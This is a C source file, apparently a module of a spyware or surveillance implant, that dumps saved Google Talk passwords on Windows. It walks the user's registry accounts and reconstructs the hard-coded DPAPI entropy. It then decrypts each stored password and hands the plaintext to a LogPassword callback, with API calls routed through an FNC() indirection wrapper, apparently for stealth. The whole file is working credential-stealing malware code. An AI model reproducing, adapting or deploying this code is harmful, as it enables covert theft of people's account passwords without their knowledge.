
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include "..\\common.h"

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

struct p_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

int decode_pass_gtalk(char *pass, char *decoded)
{
	HANDLE hProc;
	BYTE TokenInfo[0x200];
	CHAR UserName[256];
	DWORD UserLen = 256, len;
	CHAR DomainName[256];
	DWORD DomainLen = 256;
	CHAR entString[512];
	SID_NAME_USE peuse;
	PTOKEN_USER ptu;
	BYTE blob[1024];
	DATA_BLOB dataIn;
	DATA_BLOB entropy;
	DATA_BLOB dataOut;

	// get user informations...
	FNC(OpenProcessToken)(FNC(GetCurrentProcess)(), TOKEN_QUERY, &hProc);
	if (hProc == NULL)
		return 0;

	if (FNC(GetTokenInformation)(hProc, TokenUser, TokenInfo, 0x200, &len) == 0) {
		CloseHandle(hProc);
		return 0;
	}
	ptu = (PTOKEN_USER)&TokenInfo;

	if (FNC(LookupAccountSidA)(NULL, ptu->User.Sid, UserName, &UserLen, DomainName, &DomainLen, &peuse) == 0) {
		CloseHandle(hProc);
		return 0;
	}

	CloseHandle(hProc);

	sprintf_s(entString, 512, "%s%s", UserName, DomainName);

	unsigned char entropybuf[16] = { 0xa3, 0x1e, 0xf3, 0x69, 0x07, 0x62, 0xd9, 0x1f,
								     0x1e, 0xe9, 0x35, 0x7d, 0x4f, 0xd2, 0x7d, 0x48 };

	unsigned int magic = 0xba0da71d;
	unsigned int *val;
	unsigned int i;

	for(i = 0; i < UserLen + DomainLen; i++) {
		val = (unsigned int *)(&entropybuf[(i * 4) % 16]);
		*val ^= (entString[i] * magic);
		magic *= 0x0bc8f;
	}

	magic = *((unsigned int *)entropybuf) | 1; // e` la prima word dell'entropia

	for(i = 4; i < strlen(pass); i += 2) {
		blob[(i-4)/2] = (((pass[i] - 1)<<4) | (pass[i + 1] - 0x21)) - (magic & 0xff);
		magic *= 0x10ff5;
	}

	dataIn.pbData = blob;
	dataIn.cbData = (i-4)/2;
	entropy.pbData = entropybuf;
	entropy.cbData = 16;


	if (FNC(CryptUnprotectData)(&dataIn, NULL, &entropy, NULL, (CRYPTPROTECT_PROMPTSTRUCT *)NULL, 1, &dataOut)) {
		memcpy(decoded, dataOut.pbData, dataOut.cbData);
		LocalFree(dataOut.pbData);
		return dataOut.cbData;
	} 

	return 0;
}

int DumpGtalk(void)
{
	HKEY hreg, hsub;
	DWORD nreg = 0, nsub = 0;
	WCHAR keyname[MAX_PATH];
	WCHAR userkey[MAX_PATH];
	CHAR password[1024];
	DWORD size;
	struct p_entry ptentry;

	if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, L"Software\\Google\\Google Talk\\Accounts", &hreg) != ERROR_SUCCESS)
		return 0;

	// enumerate all the users
	while (FNC(RegEnumKeyW)(hreg, nreg++, keyname, MAX_PATH) == ERROR_SUCCESS) {
		nsub = 0;

		memset(&ptentry, 0, sizeof(ptentry));

		swprintf_s(ptentry.service, 255, L"Google Talk");

		_snwprintf_s(userkey, MAX_PATH, L"Software\\Google\\Google Talk\\Accounts\\%s", keyname);
		
		// open the user section
		if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, userkey, &hsub) != ERROR_SUCCESS)
			continue;

		size = sizeof(password);
		if (FNC(RegQueryValueExA)(hsub, "pw", NULL, NULL, (LPBYTE)&password, &size) == ERROR_SUCCESS) {
			CHAR user[MAX_PATH];
			CHAR decoded[1024];
			sprintf_s(user, MAX_PATH, "%S", keyname);
			memset(decoded, 0, MAX_PATH);
			
			swprintf_s(ptentry.resource, 255, L"GTALK");
			swprintf_s(ptentry.user_value, 255, L"%S", user);
			decode_pass_gtalk(password, decoded);
			swprintf_s(ptentry.pass_value, 255, L"%S", decoded);
			LogPassword(ptentry.service, ptentry.resource, ptentry.user_value, ptentry.pass_value);
		}

		FNC(RegCloseKey)(hsub);
	}
	FNC(RegCloseKey)(hreg);

	return 0;
}
